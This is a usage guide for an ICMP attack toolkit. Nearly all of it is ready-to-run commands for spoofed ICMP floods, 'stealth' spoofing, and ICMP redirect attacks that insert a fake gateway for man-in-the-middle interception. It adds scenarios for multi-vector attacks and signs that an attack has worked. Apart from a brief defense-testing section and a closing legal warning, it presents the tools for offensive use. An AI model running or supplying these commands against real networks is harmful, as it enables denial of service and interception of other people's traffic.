# ICMP Attack Tool - Usage Guide

## 🚀 Quick Start

### Setup
```bash
# Automated setup (Arch Linux)
./setup_arch.sh

# Manual setup
sudo pacman -S python python-pip tcpdump
pip install -r requirements.txt
```

### Interactive Demo
```bash
# Complete demonstration with visual monitoring
sudo python3 demo_attack.py
```

## ⚡ Attack Tools

### 1. Main Attack Tool (`icmp_attack_tool.py`)

**Interactive Mode:**
```bash
sudo python3 icmp_attack_tool.py
```

**Command Line Mode:**
```bash
# ICMP Spoofing
sudo python3 icmp_attack_tool.py --target 192.168.1.1 --type spoof --count 50

# ICMP Redirect
sudo python3 icmp_attack_tool.py --target 8.8.8.8 --victim 192.168.1.20 --gateway 192.168.1.1 --type redirect

# Continuous Attack
sudo python3 icmp_attack_tool.py --target 192.168.1.1 --type spoof --continuous

# Live Monitor
sudo python3 icmp_attack_tool.py --monitor
```

### 2. ICMP Spoofer (`icmp_spoofer.py`)

**Basic Attacks:**
```bash
# Simple spoofing
sudo python3 icmp_spoofer.py 192.168.1.1

# Custom source IP
sudo python3 icmp_spoofer.py 192.168.1.1 --source 10.0.0.1

# High volume attack
sudo python3 icmp_spoofer.py 192.168.1.1 --count 100 --delay 0.1
```

**Advanced Attacks:**
```bash
# Continuous spoofing
sudo python3 icmp_spoofer.py 192.168.1.1 --continuous

# High-speed flood
sudo python3 icmp_spoofer.py 192.168.1.1 --flood --duration 60

# Stealth scan
sudo python3 icmp_spoofer.py 192.168.1.1 --stealth

# Custom ICMP type
sudo python3 icmp_spoofer.py 192.168.1.1 --type 13 --code 0
```

### 3. ICMP Redirect (`icmp_redirect.py`)

**Basic Redirect:**
```bash
# Single redirect
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1

# With custom fake gateway
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --fake-gateway 192.168.1.100
```

**Advanced Redirects:**
```bash
# Continuous redirect mode
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --continuous

# Stealth redirect
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --stealth

# MITM setup
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --mitm

# Monitor only
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --monitor-only --duration 120
```

### 4. Attack Monitor (`attack_monitor.py`)

**Real-time Monitoring:**
```bash
# Monitor all ICMP traffic
sudo python3 attack_monitor.py

# Monitor specific targets
sudo python3 attack_monitor.py --targets 192.168.1.1,192.168.1.20

# Monitor specific interface
sudo python3 attack_monitor.py --interface eth0

# Custom packet filter
sudo python3 attack_monitor.py --filter "icmp or arp"
```

## 🔥 Attack Scenarios

### Scenario 1: Simple Spoofing Attack
```bash
# Terminal 1: Start monitoring
sudo python3 attack_monitor.py --targets 192.168.1.1

# Terminal 2: Launch spoofing attack  
sudo python3 icmp_spoofer.py 192.168.1.1 --count 20 --delay 0.5
```

### Scenario 2: Redirect Attack with Monitoring
```bash
# Terminal 1: Start monitoring dashboard
sudo python3 attack_monitor.py --targets 192.168.1.20,8.8.8.8

# Terminal 2: Launch redirect attack
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --continuous --duration 120
```

### Scenario 3: Multi-vector Attack
```bash
# Terminal 1: Monitor dashboard
sudo python3 attack_monitor.py

# Terminal 2: Spoofing attack
sudo python3 icmp_spoofer.py 192.168.1.1 --flood --duration 180

# Terminal 3: Redirect attack  
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1 --continuous --duration 180
```

### Scenario 4: Complete Demo
```bash
# All-in-one demonstration
sudo python3 demo_attack.py
# Follow the interactive menu
```

## 📊 Visual Monitoring Features

### Live Attack Dashboard
The attack monitor provides real-time visualization:
- **Attack Statistics**: Live packet counts and success rates
- **Network Activity**: Real-time packet analysis
- **Security Alerts**: Immediate attack detection
- **Activity Graphs**: ASCII-based intensity visualization
- **Routing Changes**: Automatic routing table monitoring

### Sample Dashboard Output
```
================================================================================
                           ATTACK STATISTICS  
================================================================================
📊 MONITORING STATUS:
   ⏰ Uptime: 00:05:23
   📦 Total Packets: 1,847
   🧊 ICMP Packets: 1,203
   🔀 Spoofed Packets: 45
   📤 Redirect Packets: 12
   📥 Responses: 789
   🔄 Routing Changes: 3

📡 NETWORK STATUS: 🔥 ACTIVE ATTACK

================================================================================
                         RECENT PACKET ACTIVITY
================================================================================
   [14:23:45] SUSPICIOUS PING: 10.0.0.1 → 192.168.1.1
   [14:23:46] PONG: 192.168.1.1 → 10.0.0.1
   [14:23:47] REDIRECT: 192.168.1.1 → 192.168.1.20 (GW: 192.168.1.100)
   [14:23:48] PING: 192.168.1.20 → 8.8.8.8
   [14:23:49] SUSPICIOUS PING: 172.16.0.1 → 192.168.1.1

================================================================================
                            SECURITY ALERTS
================================================================================
   [14:23:45] Suspicious ICMP echo from 10.0.0.1
   [14:23:47] ICMP Redirect detected: 192.168.1.1 → 192.168.1.20
   [14:23:49] Routing table change detected!

================================================================================
                         ATTACK INTENSITY GRAPH
================================================================================
   ICMP: ████████████████████████████████████████████████████████████████ [1203]
   SPOOF: ██████████████████████████████████████████████████ [45]
   REDIRECT: ████████████████████████ [12]
```

## 🔧 Advanced Usage

### Custom Packet Crafting
```bash
# Custom ICMP types
sudo python3 icmp_spoofer.py 192.168.1.1 --type 13 --code 0  # Timestamp request
sudo python3 icmp_spoofer.py 192.168.1.1 --type 17 --code 0  # Address mask request

# Custom payload
sudo python3 icmp_spoofer.py 192.168.1.1 --payload "Custom data here"
```

### Performance Tuning
```bash
# High-speed attacks
sudo python3 icmp_spoofer.py 192.168.1.1 --flood --duration 60

# Low-profile stealth
sudo python3 icmp_spoofer.py 192.168.1.1 --stealth

# Sustained attacks
sudo python3 icmp_spoofer.py 192.168.1.1 --continuous --delay 2
```

### Monitoring Customization
```bash
# Specific interface monitoring
sudo python3 attack_monitor.py --interface wlan0

# Custom packet filters
sudo python3 attack_monitor.py --filter "icmp and host 192.168.1.1"

# Multiple target monitoring
sudo python3 attack_monitor.py --targets "192.168.1.1,192.168.1.20,8.8.8.8"
```

## 📈 Attack Verification

### Routing Table Analysis
```bash
# Check current routes
ip route show

# Monitor route changes
watch -n 1 'ip route show | grep 192.168.1'

# Trace route verification
traceroute 8.8.8.8
```

### Network Traffic Analysis
```bash
# Monitor ICMP traffic
sudo tcpdump -i any icmp

# Detailed packet analysis
sudo tcpdump -i any -vvv icmp

# Monitor specific hosts
sudo tcpdump -i any host 192.168.1.20
```

### Attack Success Indicators
- **Spoofing Success**: Response packets to spoofed source IPs
- **Redirect Success**: Routing table changes on victim
- **Traffic Redirection**: Packets flowing through attacker machine
- **Response Rate**: High response rate indicates successful spoofing

## 🛡️ Defense Testing

### Test Network Hardening
```bash
# Test ICMP filtering
sudo python3 icmp_spoofer.py 192.168.1.1 --count 10

# Test redirect protection
sudo python3 icmp_redirect.py 192.168.1.20 8.8.8.8 192.168.1.1

# Monitor defensive responses
sudo python3 attack_monitor.py --targets 192.168.1.20
```

### Validate Security Controls
- Test firewall ICMP rules
- Verify routing table protection
- Check intrusion detection responses
- Validate network monitoring alerts

## ⚠️ Important Notes

### Prerequisites
- Root privileges required for raw sockets
- Target systems must be reachable
- Network interface must support packet injection
- Sufficient bandwidth for high-speed attacks

### Best Practices
- Always run monitoring before attacks
- Use appropriate attack intensity
- Monitor system resources during attacks
- Clean up processes after testing
- Document attack results

### Troubleshooting
- **Permission denied**: Ensure running as root
- **No responses**: Check target connectivity
- **Low success rate**: Verify network configuration
- **Performance issues**: Reduce attack intensity

---

**⚠️ LEGAL WARNING:** Use only in authorized environments. Unauthorized attacks are illegal. 